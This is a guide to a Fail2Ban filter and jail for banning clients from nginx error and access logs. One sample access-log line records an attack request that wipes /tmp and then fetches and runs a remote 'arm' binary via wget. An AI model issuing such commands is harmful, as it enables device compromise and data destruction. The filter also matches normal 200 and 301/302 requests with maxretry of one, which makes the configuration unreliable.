###### Fail2Ban-Filter_NGINX_bad-web-requests_failed-SSL-handshakes

## Fail2Ban filter nginx error.log / access.log to match bad web requests &amp; failed SSL handshakes

###### source nginx errors log
> /var/log/nginx/error.log
> /var/log/nginx/access.log

###### samples error.log records
```
{date} {time} [error] {xyz}#{xyz}: *{zyx} open() "/path/to/some/file" failed (2: No such file or directory), client: {source_ip}, server: localhost, request: "{some_request} HTTP/1.1", host: "{target_hostname}"
{date} {time} [error] {xyz}#{xyz}: *{zyx} "/path/to/some/file" is not found (2: No such file or directory), client: {source_ip}, server: localhost, request: "{some_request} HTTP/1.1", host: "{target_ip}"
{date} {time} [error] {xyz}#{xyz}: *{zyx} access forbidden by rule, client: {source_ip}, server: {target_hostname}, request: "{some_request} HTTP/1.1", host: "{target_ip}"
{date} {time} [crit] {xyz}#{xyz}: *{zyx} SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: {source_ip}, server: 0.0.0.0:443
{source_ip} - - [{date} {time}] "GET /_phpmyadmin/index.php?lang=en HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
{source_ip} - - [{date} {time}] "GET / HTTP/1.1" 400 150 "-" "-"
{source_ip} - - [{date} {time}] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
{source_ip} - - [{date} {time}] "GET /shell?cd+/tmp;rm+-rf+*;wget+ http://some.IP/.s4y/arm;sh+/tmp/arm HTTP/1.1" 400 150 "-" "-"
{source_ip} - - [{date} {time}] "GET /.well-known/nodeinfo HTTP/1.1" 301 162 "-" "axios/0.21.4"
{source_ip} - - [{date} {time}] "GET /statistics.json HTTP/1.1" 302 5 "-" "Friendica 'Siberian Iris' {date}; https://nerdica.net"
```

###### Fail2Ban filter conf
```
# Fail2Ban filter nginx to match bad web requests & failed SSL handshakes
# /var/log/nginx/error.log
# /var/log/nginx/access.log

[INCLUDES]

[Definition]

failregex = ^ \[error\] \d+#\d+: \*\d+ (\S+ )?\"\S+\" (failed|is not found) \(2\: No such file or directory\), client\: <HOST>, server\: \S*\, request: .*?
            ^ \[error\] \d+#\d+: \*\d+ access forbidden by rule, client\: <HOST>, server\: \S*\, request: .*?
            ^ \[crit\] \d+#\d+: \*\d+ SSL_do_handshake\(\) failed \(SSL\: error\:141CF06C\:SSL routines\:tls_parse_ctos_key_share\:bad key share\) while SSL handshaking, client\: <HOST>, server\: .*?
            ^<HOST> - - .*GET.* (400|401|403|404|405|406|407|409|429|444|495|496|499) .*?
            ^<HOST> - - .*GET.* (200|204) .*?
            ^<HOST> - - .*GET.* (301|302) .*?
            ^<HOST> - - .*GET.*(\.php|\.asp|\.exe|\.pl|\.cgi|\scgi) .*?

ignoreregex =

datepattern = {^LN-BEG}%%ExY(?P<_sep>[-/.])%%m(?P=_sep)%%d[T ]%%H:%%M:%%S(?:[.,]%%f)?(?:\s*%%z)?
              ^[^\[]*\[({DATE})
              {^LN-BEG}

# DEV Notes:
# Based on nginx-botsearch filter & nginx-bad-request
# 
# Author: FM
```

###### sample jail conf
```
[nginx-error]
backend = auto
enabled = true
filter = nginx-error
logpath = /var/log/nginx/*.log
findtime = 604800
bantime = 86400
maxretry = 1
```
